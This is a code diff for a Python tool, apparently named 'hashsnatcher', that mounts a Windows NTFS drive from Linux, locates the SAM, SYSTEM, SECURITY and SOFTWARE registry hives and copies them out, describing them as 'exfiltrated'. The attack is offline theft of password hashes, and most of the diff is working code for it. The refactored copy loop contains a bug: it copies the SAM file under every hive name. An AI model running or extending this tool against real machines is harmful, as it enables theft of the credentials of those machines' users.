@@ -6,7 +6,6 @@
 # file systems to mount and then exfils data. Only looks for NTFS 
 #and exfils the calc.exe program for now.
 
-#maybe import os?
 
 import sys, subprocess, argparse, time, shutil, os, datetime
 
@@ -32,6 +31,9 @@ class Drive:
         else:
             return 'no'
 
+
+
+
 #Run the command sudo blkid and then recieve its output as a bytes
 #Decode using utf-8 and then split on \n
 def grab_drives():
@@ -55,61 +57,58 @@ def mount_drive(drive):
     # to exploit different file systems got rid of /etc/services 
     # from mount command. Don't think I need it
     try:
-        os.mkdir('/media/windows')
-        print('/media/windows has been created for you, and will'
+        os.mkdir('/mnt/windows')
+        print('/mnt/windows has been created for you, and will'
                 ' be used as a mounting point')
     except PermissionError:
         print('was unable to create mountpoint. Please run '
                 'hashsnatcher as root.')
         sys.exit()
     except FileExistsError:
-        print('/media/windows exists, and will be used as a '
+        print('/mnt/windows exists, and will be used as a '
                 'mounting point')
     subprocess.Popen('sudo mount -t ntfs-3g -o nls=utf8 {} '
-            '/media/windows'.format(drive.get_source()), shell=True)
+            '/mnt/windows'.format(drive.get_source()), shell=True)
     time.sleep(1)
+
+def locate_hives():
+    raw_targets = os.listdir('/mnt/windows/Windows/System32/config')
+    targets = []
+    for target in raw_targets:
+        if 'sam' == target.casefold():
+            targets.append(target)
+        elif 'system' == target.casefold():
+            targets.append(target)
+
+        elif 'security' == target.casefold():
+            targets.append(target)
+        elif 'software' == target.casefold():
+            targets.append(target)
+    return targets
 
 def copy_winpayload():
     # gotta use the mount point made by mount_drive here from the 
     # user input i should implement some code that suggests a drive 
     # to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
-
+    
+    target_hives = locate_hives()
     stamp = str(datetime.datetime.now().timestamp())
     directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
     os.mkdir(directory) 
+    
+    for hive in target_hives:
+        try:
+            shutil.copyfile('/mnt/windows/Windows/System32/config/sam', 
+                    '{}/{}'.format(directory, hive))
+        except FileNotFoundError as e:
+            print('{} not found'.format(hive))
 
-    try:
-        shutil.copyfile('/media/windows/Windows/System32/config/sam', 
-                '{}/sam'.format(directory))
-    except FileNotFoundError as e:
-        print('sam not found')
-
-    try:
-        shutil.copyfile('/media/windows/Windows/System32/config/system',
-                '{}/system'.format(directory))
-    except FileNotFoundError as e:
-        print('system not found')
-
-    try:
-        shutil.copyfile('/media/windows/Windows/System32/config/security', 
-                '{}/security'.format(directory))
-    except FileNotFoundError as e:
-        print('security not found')
-    try:
-        shutil.copyfile('/media/windows/Windows/System32/config/software',
-                '{}/software'.format(directory))
-    except FileNotFoundError as e:
-        print('software not found')
-        
-        # subprocess.Popen('sudo cp /media/windows/hyberfil.sys' 
-        # '/home/galactic_t0ast/Desktop/hyberfil.sys', shell=True)
     print('registry hives have been succesfully exfiltrated to your pwd')
-
-    #optimize this...
+    # optimize this...
     time.sleep(1)
-    subprocess.Popen('sudo umount /media/windows', shell=True)
-    print('Drive has been unmounted from /media/windows')
+    subprocess.Popen('sudo umount /mnt/windows', shell=True)
+    print('Drive has been unmounted from /mnt/windows')
 
 def store_drives(raw_drives):
     # takes as input raw_drives from the blkid command
